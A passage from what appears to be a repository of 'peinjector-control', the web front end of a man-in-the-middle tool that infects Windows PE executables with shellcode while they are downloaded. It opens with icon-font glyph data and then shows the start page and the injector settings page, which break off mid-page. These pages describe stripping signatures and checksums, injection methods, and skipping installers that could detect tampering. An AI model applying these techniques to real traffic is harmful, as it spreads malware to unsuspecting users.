<glyph unicode="&#xe230;" d="M212 1198h780q86 0 147 -61t61 -147v-416q0 -51 -18 -142.5t-36 -157.5l-18 -66q-29 -87 -93.5 -146.5t-146.5 -59.5h-572q-82 0 -147 59t-93 147q-8 28 -20 73t-32 143.5t-20 149.5v416q0 86 61 147t147 61zM600 1045q-70 0 -132.5 -11.5t-105.5 -30.5t-78.5 -41.5 t-57 -45t-36 -41t-20.5 -30.5l-6 -12l156 -243h560l156 243q-2 5 -6 12.5t-20 29.5t-36.5 42t-57 44.5t-79 42t-105 29.5t-132.5 12zM762 703h-157l195 261z" />
<glyph unicode="&#xe231;" d="M475 1300h150q103 0 189 -86t86 -189v-500q0 -41 -42 -83t-83 -42h-450q-41 0 -83 42t-42 83v500q0 103 86 189t189 86zM700 300v-225q0 -21 -27 -48t-48 -27h-150q-21 0 -48 27t-27 48v225h300z" />
<glyph unicode="&#xe232;" d="M475 1300h96q0 -150 89.5 -239.5t239.5 -89.5v-446q0 -41 -42 -83t-83 -42h-450q-41 0 -83 42t-42 83v500q0 103 86 189t189 86zM700 300v-225q0 -21 -27 -48t-48 -27h-150q-21 0 -48 27t-27 48v225h300z" />
<glyph unicode="&#xe233;" d="M1294 767l-638 -283l-378 170l-78 -60v-224l100 -150v-199l-150 148l-150 -149v200l100 150v250q0 4 -0.5 10.5t0 9.5t1 8t3 8t6.5 6l47 40l-147 65l642 283zM1000 380l-350 -166l-350 166v147l350 -165l350 165v-147z" />
<glyph unicode="&#xe234;" d="M250 800q62 0 106 -44t44 -106t-44 -106t-106 -44t-106 44t-44 106t44 106t106 44zM650 800q62 0 106 -44t44 -106t-44 -106t-106 -44t-106 44t-44 106t44 106t106 44zM1050 800q62 0 106 -44t44 -106t-44 -106t-106 -44t-106 44t-44 106t44 106t106 44z" />
<glyph unicode="&#xe235;" d="M550 1100q62 0 106 -44t44 -106t-44 -106t-106 -44t-106 44t-44 106t44 106t106 44zM550 700q62 0 106 -44t44 -106t-44 -106t-106 -44t-106 44t-44 106t44 106t106 44zM550 300q62 0 106 -44t44 -106t-44 -106t-106 -44t-106 44t-44 106t44 106t106 44z" />
<glyph unicode="&#xe236;" d="M125 1100h950q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5t-17.5 -7.5h-950q-10 0 -17.5 7.5t-7.5 17.5v150q0 10 7.5 17.5t17.5 7.5zM125 700h950q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5t-17.5 -7.5h-950q-10 0 -17.5 7.5t-7.5 17.5v150q0 10 7.5 17.5 t17.5 7.5zM125 300h950q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5t-17.5 -7.5h-950q-10 0 -17.5 7.5t-7.5 17.5v150q0 10 7.5 17.5t17.5 7.5z" />
<glyph unicode="&#xe237;" d="M350 1200h500q162 0 256 -93.5t94 -256.5v-500q0 -165 -93.5 -257.5t-256.5 -92.5h-500q-165 0 -257.5 92.5t-92.5 257.5v500q0 165 92.5 257.5t257.5 92.5zM900 1000h-600q-41 0 -70.5 -29.5t-29.5 -70.5v-600q0 -41 29.5 -70.5t70.5 -29.5h600q41 0 70.5 29.5 t29.5 70.5v600q0 41 -29.5 70.5t-70.5 29.5zM350 900h500q21 0 35.5 -14.5t14.5 -35.5v-300q0 -21 -14.5 -35.5t-35.5 -14.5h-500q-21 0 -35.5 14.5t-14.5 35.5v300q0 21 14.5 35.5t35.5 14.5zM400 800v-200h400v200h-400z" />
<glyph unicode="&#xe238;" d="M150 1100h1000q21 0 35.5 -14.5t14.5 -35.5t-14.5 -35.5t-35.5 -14.5h-50v-200h50q21 0 35.5 -14.5t14.5 -35.5t-14.5 -35.5t-35.5 -14.5h-50v-200h50q21 0 35.5 -14.5t14.5 -35.5t-14.5 -35.5t-35.5 -14.5h-50v-200h50q21 0 35.5 -14.5t14.5 -35.5t-14.5 -35.5 t-35.5 -14.5h-1000q-21 0 -35.5 14.5t-14.5 35.5t14.5 35.5t35.5 14.5h50v200h-50q-21 0 -35.5 14.5t-14.5 35.5t14.5 35.5t35.5 14.5h50v200h-50q-21 0 -35.5 14.5t-14.5 35.5t14.5 35.5t35.5 14.5h50v200h-50q-21 0 -35.5 14.5t-14.5 35.5t14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe239;" d="M650 1187q87 -67 118.5 -156t0 -178t-118.5 -155q-87 66 -118.5 155t0 178t118.5 156zM300 800q124 0 212 -88t88 -212q-124 0 -212 88t-88 212zM1000 800q0 -124 -88 -212t-212 -88q0 124 88 212t212 88zM300 500q124 0 212 -88t88 -212q-124 0 -212 88t-88 212z M1000 500q0 -124 -88 -212t-212 -88q0 124 88 212t212 88zM700 199v-144q0 -21 -14.5 -35.5t-35.5 -14.5t-35.5 14.5t-14.5 35.5v142q40 -4 43 -4q17 0 57 6z" />
<glyph unicode="&#xe240;" d="M745 878l69 19q25 6 45 -12l298 -295q11 -11 15 -26.5t-2 -30.5q-5 -14 -18 -23.5t-28 -9.5h-8q1 0 1 -13q0 -29 -2 -56t-8.5 -62t-20 -63t-33 -53t-51 -39t-72.5 -14h-146q-184 0 -184 288q0 24 10 47q-20 4 -62 4t-63 -4q11 -24 11 -47q0 -288 -184 -288h-142 q-48 0 -84.5 21t-56 51t-32 71.5t-16 75t-3.5 68.5q0 13 2 13h-7q-15 0 -27.5 9.5t-18.5 23.5q-6 15 -2 30.5t15 25.5l298 296q20 18 46 11l76 -19q20 -5 30.5 -22.5t5.5 -37.5t-22.5 -31t-37.5 -5l-51 12l-182 -193h891l-182 193l-44 -12q-20 -5 -37.5 6t-22.5 31t6 37.5 t31 22.5z" />
<glyph unicode="&#xe241;" d="M1200 900h-50q0 21 -4 37t-9.5 26.5t-18 17.5t-22 11t-28.5 5.5t-31 2t-37 0.5h-200v-850q0 -22 25 -34.5t50 -13.5l25 -2v-100h-400v100q4 0 11 0.5t24 3t30 7t24 15t11 24.5v850h-200q-25 0 -37 -0.5t-31 -2t-28.5 -5.5t-22 -11t-18 -17.5t-9.5 -26.5t-4 -37h-50v300 h1000v-300zM500 450h-25q0 15 -4 24.5t-9 14.5t-17 7.5t-20 3t-25 0.5h-100v-425q0 -11 12.5 -17.5t25.5 -7.5h12v-50h-200v50q50 0 50 25v425h-100q-17 0 -25 -0.5t-20 -3t-17 -7.5t-9 -14.5t-4 -24.5h-25v150h500v-150z" />
<glyph unicode="&#xe242;" d="M1000 300v50q-25 0 -55 32q-14 14 -25 31t-16 27l-4 11l-289 747h-69l-300 -754q-18 -35 -39 -56q-9 -9 -24.5 -18.5t-26.5 -14.5l-11 -5v-50h273v50q-49 0 -78.5 21.5t-11.5 67.5l69 176h293l61 -166q13 -34 -3.5 -66.5t-55.5 -32.5v-50h312zM412 691l134 342l121 -342 h-255zM1100 150v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-1000q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5h1000q21 0 35.5 -14.5t14.5 -35.5z" />
<glyph unicode="&#xe243;" d="M50 1200h1100q21 0 35.5 -14.5t14.5 -35.5v-1100q0 -21 -14.5 -35.5t-35.5 -14.5h-1100q-21 0 -35.5 14.5t-14.5 35.5v1100q0 21 14.5 35.5t35.5 14.5zM611 1118h-70q-13 0 -18 -12l-299 -753q-17 -32 -35 -51q-18 -18 -56 -34q-12 -5 -12 -18v-50q0 -8 5.5 -14t14.5 -6 h273q8 0 14 6t6 14v50q0 8 -6 14t-14 6q-55 0 -71 23q-10 14 0 39l63 163h266l57 -153q11 -31 -6 -55q-12 -17 -36 -17q-8 0 -14 -6t-6 -14v-50q0 -8 6 -14t14 -6h313q8 0 14 6t6 14v50q0 7 -5.5 13t-13.5 7q-17 0 -42 25q-25 27 -40 63h-1l-288 748q-5 12 -19 12zM639 611 h-197l103 264z" />
<glyph unicode="&#xe244;" d="M1200 1100h-1200v100h1200v-100zM50 1000h400q21 0 35.5 -14.5t14.5 -35.5v-900q0 -21 -14.5 -35.5t-35.5 -14.5h-400q-21 0 -35.5 14.5t-14.5 35.5v900q0 21 14.5 35.5t35.5 14.5zM650 1000h400q21 0 35.5 -14.5t14.5 -35.5v-400q0 -21 -14.5 -35.5t-35.5 -14.5h-400 q-21 0 -35.5 14.5t-14.5 35.5v400q0 21 14.5 35.5t35.5 14.5zM700 900v-300h300v300h-300z" />
<glyph unicode="&#xe245;" d="M50 1200h400q21 0 35.5 -14.5t14.5 -35.5v-900q0 -21 -14.5 -35.5t-35.5 -14.5h-400q-21 0 -35.5 14.5t-14.5 35.5v900q0 21 14.5 35.5t35.5 14.5zM650 700h400q21 0 35.5 -14.5t14.5 -35.5v-400q0 -21 -14.5 -35.5t-35.5 -14.5h-400q-21 0 -35.5 14.5t-14.5 35.5v400 q0 21 14.5 35.5t35.5 14.5zM700 600v-300h300v300h-300zM1200 0h-1200v100h1200v-100z" />
<glyph unicode="&#xe246;" d="M50 1000h400q21 0 35.5 -14.5t14.5 -35.5v-350h100v150q0 21 14.5 35.5t35.5 14.5h400q21 0 35.5 -14.5t14.5 -35.5v-150h100v-100h-100v-150q0 -21 -14.5 -35.5t-35.5 -14.5h-400q-21 0 -35.5 14.5t-14.5 35.5v150h-100v-350q0 -21 -14.5 -35.5t-35.5 -14.5h-400 q-21 0 -35.5 14.5t-14.5 35.5v800q0 21 14.5 35.5t35.5 14.5zM700 700v-300h300v300h-300z" />
<glyph unicode="&#xe247;" d="M100 0h-100v1200h100v-1200zM250 1100h400q21 0 35.5 -14.5t14.5 -35.5v-400q0 -21 -14.5 -35.5t-35.5 -14.5h-400q-21 0 -35.5 14.5t-14.5 35.5v400q0 21 14.5 35.5t35.5 14.5zM300 1000v-300h300v300h-300zM250 500h900q21 0 35.5 -14.5t14.5 -35.5v-400 q0 -21 -14.5 -35.5t-35.5 -14.5h-900q-21 0 -35.5 14.5t-14.5 35.5v400q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe248;" d="M600 1100h150q21 0 35.5 -14.5t14.5 -35.5v-400q0 -21 -14.5 -35.5t-35.5 -14.5h-150v-100h450q21 0 35.5 -14.5t14.5 -35.5v-400q0 -21 -14.5 -35.5t-35.5 -14.5h-900q-21 0 -35.5 14.5t-14.5 35.5v400q0 21 14.5 35.5t35.5 14.5h350v100h-150q-21 0 -35.5 14.5 t-14.5 35.5v400q0 21 14.5 35.5t35.5 14.5h150v100h100v-100zM400 1000v-300h300v300h-300z" />
<glyph unicode="&#xe249;" d="M1200 0h-100v1200h100v-1200zM550 1100h400q21 0 35.5 -14.5t14.5 -35.5v-400q0 -21 -14.5 -35.5t-35.5 -14.5h-400q-21 0 -35.5 14.5t-14.5 35.5v400q0 21 14.5 35.5t35.5 14.5zM600 1000v-300h300v300h-300zM50 500h900q21 0 35.5 -14.5t14.5 -35.5v-400 q0 -21 -14.5 -35.5t-35.5 -14.5h-900q-21 0 -35.5 14.5t-14.5 35.5v400q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe250;" d="M865 565l-494 -494q-23 -23 -41 -23q-14 0 -22 13.5t-8 38.5v1000q0 25 8 38.5t22 13.5q18 0 41 -23l494 -494q14 -14 14 -35t-14 -35z" />
<glyph unicode="&#xe251;" d="M335 635l494 494q29 29 50 20.5t21 -49.5v-1000q0 -41 -21 -49.5t-50 20.5l-494 494q-14 14 -14 35t14 35z" />
<glyph unicode="&#xe252;" d="M100 900h1000q41 0 49.5 -21t-20.5 -50l-494 -494q-14 -14 -35 -14t-35 14l-494 494q-29 29 -20.5 50t49.5 21z" />
<glyph unicode="&#xe253;" d="M635 865l494 -494q29 -29 20.5 -50t-49.5 -21h-1000q-41 0 -49.5 21t20.5 50l494 494q14 14 35 14t35 -14z" />
<glyph unicode="&#xe254;" d="M700 741v-182l-692 -323v221l413 193l-413 193v221zM1200 0h-800v200h800v-200z" />
<glyph unicode="&#xe255;" d="M1200 900h-200v-100h200v-100h-300v300h200v100h-200v100h300v-300zM0 700h50q0 21 4 37t9.5 26.5t18 17.5t22 11t28.5 5.5t31 2t37 0.5h100v-550q0 -22 -25 -34.5t-50 -13.5l-25 -2v-100h400v100q-4 0 -11 0.5t-24 3t-30 7t-24 15t-11 24.5v550h100q25 0 37 -0.5t31 -2 t28.5 -5.5t22 -11t18 -17.5t9.5 -26.5t4 -37h50v300h-800v-300z" />
<glyph unicode="&#xe256;" d="M800 700h-50q0 21 -4 37t-9.5 26.5t-18 17.5t-22 11t-28.5 5.5t-31 2t-37 0.5h-100v-550q0 -22 25 -34.5t50 -14.5l25 -1v-100h-400v100q4 0 11 0.5t24 3t30 7t24 15t11 24.5v550h-100q-25 0 -37 -0.5t-31 -2t-28.5 -5.5t-22 -11t-18 -17.5t-9.5 -26.5t-4 -37h-50v300 h800v-300zM1100 200h-200v-100h200v-100h-300v300h200v100h-200v100h300v-300z" />
<glyph unicode="&#xe257;" d="M701 1098h160q16 0 21 -11t-7 -23l-464 -464l464 -464q12 -12 7 -23t-21 -11h-160q-13 0 -23 9l-471 471q-7 8 -7 18t7 18l471 471q10 9 23 9z" />
<glyph unicode="&#xe258;" d="M339 1098h160q13 0 23 -9l471 -471q7 -8 7 -18t-7 -18l-471 -471q-10 -9 -23 -9h-160q-16 0 -21 11t7 23l464 464l-464 464q-12 12 -7 23t21 11z" />
<glyph unicode="&#xe259;" d="M1087 882q11 -5 11 -21v-160q0 -13 -9 -23l-471 -471q-8 -7 -18 -7t-18 7l-471 471q-9 10 -9 23v160q0 16 11 21t23 -7l464 -464l464 464q12 12 23 7z" />
<glyph unicode="&#xe260;" d="M618 993l471 -471q9 -10 9 -23v-160q0 -16 -11 -21t-23 7l-464 464l-464 -464q-12 -12 -23 -7t-11 21v160q0 13 9 23l471 471q8 7 18 7t18 -7z" />
<glyph unicode="&#xf8ff;" d="M1000 1200q0 -124 -88 -212t-212 -88q0 124 88 212t212 88zM450 1000h100q21 0 40 -14t26 -33l79 -194q5 1 16 3q34 6 54 9.5t60 7t65.5 1t61 -10t56.5 -23t42.5 -42t29 -64t5 -92t-19.5 -121.5q-1 -7 -3 -19.5t-11 -50t-20.5 -73t-32.5 -81.5t-46.5 -83t-64 -70 t-82.5 -50q-13 -5 -42 -5t-65.5 2.5t-47.5 2.5q-14 0 -49.5 -3.5t-63 -3.5t-43.5 7q-57 25 -104.5 78.5t-75 111.5t-46.5 112t-26 90l-7 35q-15 63 -18 115t4.5 88.5t26 64t39.5 43.5t52 25.5t58.5 13t62.5 2t59.5 -4.5t55.5 -8l-147 192q-12 18 -5.5 30t27.5 12z" />
<glyph unicode="&#x1f511;" d="M250 1200h600q21 0 35.5 -14.5t14.5 -35.5v-400q0 -21 -14.5 -35.5t-35.5 -14.5h-150v-500l-255 -178q-19 -9 -32 -1t-13 29v650h-150q-21 0 -35.5 14.5t-14.5 35.5v400q0 21 14.5 35.5t35.5 14.5zM400 1100v-100h300v100h-300z" />
<glyph unicode="&#x1f6aa;" d="M250 1200h750q39 0 69.5 -40.5t30.5 -84.5v-933l-700 -117v950l600 125h-700v-1000h-100v1025q0 23 15.5 49t34.5 26zM500 525v-100l100 20v100z" />
</font>
</defs></svg> 
```

`pe-injector-control/html/index.htm`:

```htm
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- ^ this 3 Meta-Tags firstn;  -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">

    <title>peinjector-control</title>

    <!-- Bootstrap-CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap-Theme -->
    <link href="css/bootstrap-theme.min.css" rel="stylesheet">
    <!-- second Theme -->
    <link href="css/starter-template.css" rel="stylesheet">
  </head>

  <body role="document">

    <!-- Navbar -->
    <nav class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Navigation ein-/ausblenden</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="#">peinjector-control</a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
            <li class="active"><a href="index.htm">start</a></li>
            <li><a href="injector.htm">injector</a></li>
            <li><a href="shellcode.htm">shellcode</a></li>
            <li><a href="settings.htm">settings</a></li>
            <li><a href="about.htm">about</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav><!-- END Navbar -->


    <!-- main container -->
    <div class="container theme-showcase" role="main">

      <div class="jumbotron">
        <h1>MITM PE INJECTOR</h1>
        <p class="lead"><a href="https://peinjector.eu" target="_blank" style="target-new: tab;">https://peinjector.eu</a></p>
      </div>

      <div class="row marketing">
        <h2>about</h2>
        <p>
          The executable file format on the Windows platform is PE COFF. Peinjector provides various ways to infect PE COFF files with custom payloads, without changing their original functionality. Simply put - it creates patches, which are applied seamlessly to PE files during file transfer. It is very performant, lightweight, modular and can be  operated on embedded hardware.
        </p>
        <br><h2>MITM integration</h2>
        <p>
          Integrating peinjector into your own MITM framework is very simple. You only need to send your authentication token and the suspected raw PE header (the first 4096 bytes of the  data stream should be enough)  to peinjector's data port, and pass the response to the connector which matches your MITM framework. If the connector can't create a patch from the sent data  (because the given header was no valid PE header or peinjector wasn't able to infect the file), just forward the stream as normal. Otherwise, everytime you receive data from the  intercepted connection, pass it to the connectors apply_patch() method/function and forward the infected data instead.
        </p>
          
        <br><h2>connectors</h2>
        <p>
          <div class="row">
            <div class="col-sm-1"></div>
            <div class="col-sm-1">
              <img src="images/c.png" style="width:36px;height:40px;">
            </div>
            <div class="col-sm-5">
              <br>Connector for C-based MITM framworks
            </div>
            <div class="col-sm-5">
              <br><a href="https://github.com/JonDoNym/peinjector/tree/master/peinjector/connectors/c">download</a>
            </div>
          </div>
        </p>
        <p>
          <div class="row">
            <div class="col-sm-1"></div>
            <div class="col-sm-1">
              <img src="images/python.png" style="width:90px;height:40px;">
            </div>
            <div class="col-sm-5">
              <br>Connector for Python-based MITM framworks
            </div>
            <div class="col-sm-5">
              <br><a href="https://github.com/JonDoNym/peinjector/tree/master/peinjector/connectors/python">download</a>
            </div>
          </div>
        </p>
        <p>
          <div class="row">
            <div class="col-sm-1"></div>
            <div class="col-sm-1">
              <img src="images/java.png" style="width:22px;height:40px;">
            </div>
            <div class="col-sm-5">
              <br>Connector for Java-based MITM framworks
            </div>
            <div class="col-sm-5">
              <br><a href="https://github.com/JonDoNym/peinjector/tree/master/peinjector/connectors/java">download</a>
            </div>
          </div>
        </p> 
                                      
        <br><h2>sample implementations</h2>
        <div class="row">
            <div class="col-sm-1"></div>
            <div class="col-sm-1">
              <img src="images/python.png" style="width:90px;height:40px;">
            </div>
            <div class="col-sm-10">
              <p>
                <b>peinjector-interceptor</b><br>
                Small libmproxy/mitmproxy based MITM sample implementation.
                Various proxy modes (HTTP(S), transparent, ...), SSL Interception, easily configurable through a config file.
          
                <p>Tested on Debian 7 (Wheezy) and Debian 8 (Jessie).</p>
          
                <u>See also</u><br>
                <a href="https://github.com/mitmproxy/mitmproxy" target="_blank" style="target-new: tab;">https://github.com/mitmproxy/mitmproxy</a>
              </p>
            </div>
          </div>
        
        
        <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
      </div>

    </div> <!-- END main container -->


    <!-- Bootstrap-JavaScript
    ================================================== -->
    <script src="js/jquery-2.1.3.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    
    
    <!-- My JavaScript
    ================================================== -->
    <script src="js/injector.js"></script>
    <script src="js/getconfig.js"></script>
    
  </body>
</html>

```

`pe-injector-control/html/injector.htm`:

```htm
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- ^ this 3 Meta-Tags firstn;  -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">

    <title>peinjector-control</title>

    <!-- Bootstrap-CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap-Theme -->
    <link href="css/bootstrap-theme.min.css" rel="stylesheet">
    <!-- second Theme -->
    <link href="css/starter-template.css" rel="stylesheet">
  </head>

  <body role="document">

    <!-- Navbar -->
    <nav class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Navigation ein-/ausblenden</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="#">peinjector-control</a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
            <li><a href="index.htm">start</a></li>
            <li class="active"><a href="injector.htm">injector</a></li>
            <li><a href="shellcode.htm">shellcode</a></li>
            <li><a href="settings.htm">settings</a></li>
            <li><a href="about.htm">about</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav><!-- END Navbar -->


    <!-- main container -->
    <div class="container theme-showcase" role="main">
      

      <!-- Injector Ports -->
      <div class="page-header">
        <h2>injector ports</h2>
      </div>
      
      <div class="row">  <!-- row: CONTROL Port -->
        <div class="col-sm-6">  <!-- Left Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">control port</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-7">
                <div class="input-group">
                  <input type="number" id="controlport_TXT1" class="form-control" placeholder="loading..." min="1" max="65535">
                  <span class="input-group-btn">
                    <button type="button" id="controlport_TXT2" class="btn btn-primary"><span class="glyphicon glyphicon-floppy-disk" aria-hidden="true"></span> Save</button>
                  </span>
                </div>
              </div>
              <div class="col-md-5">
                <p>Port on which the server listens for control commands (Like from this interface)</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Left -->
        <div class="col-sm-6">  <!-- Right Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">control interface</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-5">
                <div class="btn-group">
                  <button type="button" id="controlinterface_LOCAL" class="btn btn-info disabled">local</button>
                  <button type="button" id="controlinterface_GLOBAL" class="btn btn-warning disabled">global</button>
                </div>
              </div>
              <div class="col-md-7">
                <p>Sets the server to listen locally (loopback, 127.0.0.1) or globally (any, 0.0.0.0)</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Right -->
      </div>  <!-- END row --> 

      <div class="row">  <!-- row: DATA Port -->
        <div class="col-sm-6">  <!-- Left Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">data port</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-7">
                <div class="input-group">
                  <input type="number" id="dataport_TXT1" class="form-control" placeholder="loading..." min="1" max="65535">
                  <span class="input-group-btn">
                    <button type="button" id="dataport_TXT2" class="btn btn-primary"><span class="glyphicon glyphicon-floppy-disk" aria-hidden="true"></span> Save</button>
                  </span>
                </div>
              </div>
              <div class="col-md-5">
                <p>Port on which the server listens for raw data (PE files/headers)</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Left -->
        <div class="col-sm-6">  <!-- Right Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">data interface</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-5">
                <div class="btn-group">
                  <button type="button" id="datainterface_LOCAL" class="btn btn-info disabled">local</button>
                  <button type="button" id="datainterface_GLOBAL" class="btn btn-warning disabled">global</button>
                </div>
              </div>
              <div class="col-md-7">
                <p>Sets the server to listen locally (loopback, 127.0.0.1) or globally (any, 0.0.0.0)</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Right -->
      </div>  <!-- END row --> 
      
      <div class="row">  <!-- row: Token -->
        <div class="col-sm-12">  <!-- Left Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">access token</h3>
            </div>
            <div class="panel-body">
              <div class="col-lg-9">
                <div class="input-group input-group-sm">
                  <input type="text" id="token_TXT1" class="form-control" placeholder="loading..." maxlength="64">
                  <span class="input-group-btn">
                    <button type="button" id="token_CLS" class="btn btn-danger"><span class="glyphicon glyphicon-lock" aria-hidden="true"></span> Clear</button>
                    <button type="button" id="token_GEN" class="btn btn-primary"><span class="glyphicon glyphicon-cog" aria-hidden="true"></span> Generate</button>
                    <button type="button" id="token_TXT2" class="btn btn-success"><span class="glyphicon glyphicon-floppy-disk" aria-hidden="true"></span> Save</button>
                  </span>
                </div>
              </div>
              <div class="col-lg-3">
                <p>API Key</p>
              </div>
            </div>
          </div>
        </div>
      </div>  <!-- END row --> 


      <!-- Injector Flags -->
      <div class="page-header">
        <h2>injector flags</h2>
      </div>

      <div class="row">  <!-- row 1 -->
        <div class="col-sm-6">  <!-- Left Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">remove integrity checks</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-4">
                <div class="btn-group">
                  <button type="button" id="removeintegity_ON" class="btn btn-success disabled">ON</button>
                  <button type="button" id="removeintegity_OFF" class="btn btn-danger disabled">OFF</button>
                </div>
              </div>
              <div class="col-md-8">
                <p>Remove integrated integrity checks, such as PE header checksums, certificates, force-check-checksum-flag, ...</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Left -->
        <div class="col-sm-6">  <!-- Right Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">alignment method</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-4">
                <div class="btn-group">
                  <button type="button" id="alignment_ON" class="btn btn-success disabled">ON</button>
                  <button type="button" id="alignment_OFF" class="btn btn-danger disabled">OFF</button>
                </div>
              </div>
              <div class="col-md-8">
                <p>Try to inject the shellcode at the end of an executable section. This is possible because of the gap between the SizeOfRawData and the VirtualSize value.</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Right -->
      </div>  <!-- END row --> 

      <div class="row">  <!-- row 2 -->
        <div class="col-sm-6">  <!-- Left Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">alignment resize method</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-4">
                <div class="btn-group">
                  <button type="button" id="alignmentresize_ON" class="btn btn-success disabled">ON</button>
                  <button type="button" id="alignmentresize_OFF" class="btn btn-danger disabled">OFF</button>
                </div>
              </div>
              <div class="col-md-8">
                <p>Try to resize an executable section and to inject the shellcode there. This is possible because of the gap between the FileAlignment and the SectionAlignment value.</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Left -->
        <div class="col-sm-6">  <!-- Right Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">new section method</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-4">
                <div class="btn-group">
                  <button type="button" id="newsection_ON" class="btn btn-success disabled">ON</button>
                  <button type="button" id="newsection_OFF" class="btn btn-danger disabled">OFF</button>
                </div>
              </div>
              <div class="col-md-8">
                <p>Insert a new section and inject the shellcode there.</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Right -->
      </div>  <!-- END row --> 

      <div class="row">  <!-- row 3 -->
        <div class="col-sm-6">  <!-- Left Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">change flags method</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-4">
                <div class="btn-group">
                  <button type="button" id="changeflags_ON" class="btn btn-success disabled">ON</button>
                  <button type="button" id="changeflags_OFF" class="btn btn-danger disabled">OFF</button>
                </div>
              </div>
              <div class="col-md-8">
                <p>Change unmatching section flags. Might be required for "alignment method" and "alignment resize method" flags.</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Left -->
        <div class="col-sm-6">  <!-- Right Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">skip detecting executables</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-4">
                <div class="btn-group">
                  <button type="button" id="trystaystealth_ON" class="btn btn-success disabled">ON</button>
                  <button type="button" id="trystaystealth_OFF" class="btn btn-danger disabled">OFF</button>
                </div>
              </div>
              <div class="col-md-8">
                <p>Try to discover if the executable could possibly detect infection (e.g. NSIS setups) and skip the executable.</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Right -->
      </div>  <!-- END row --> 

      <div class="row">  <!-- row 3 -->
        <div class="col-sm-6">  <!-- Left Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">random section name</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-4">
                <div class="btn-group">
                  <button type="button" id="randomsectionname_ON" class="btn btn-success disabled">ON</button>
                  <button type="button" id="randomsectionname_OFF" class="btn btn-danger disabled">OFF</button>
                </div>
              </div>
              <div class="col-md-8">
                <p>Generate a random name for sections created by the "new section name" flag.</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Left -->
        <div class="col-sm-6">  <!-- Right Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">new section name</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-6">
                <div class="input-group">
                  <input type="text" id="sectionname_TXT1" class="form-control">
                  <span class="input-group-btn">
                    <button type="button" id="sectionname_TXT2" class="btn btn-primary"><span class="glyphicon glyphicon-floppy-disk" aria-hidden="true"></span> Save</button>
                  </span>
                </div>
              </div>
              <div class="col-md-6">
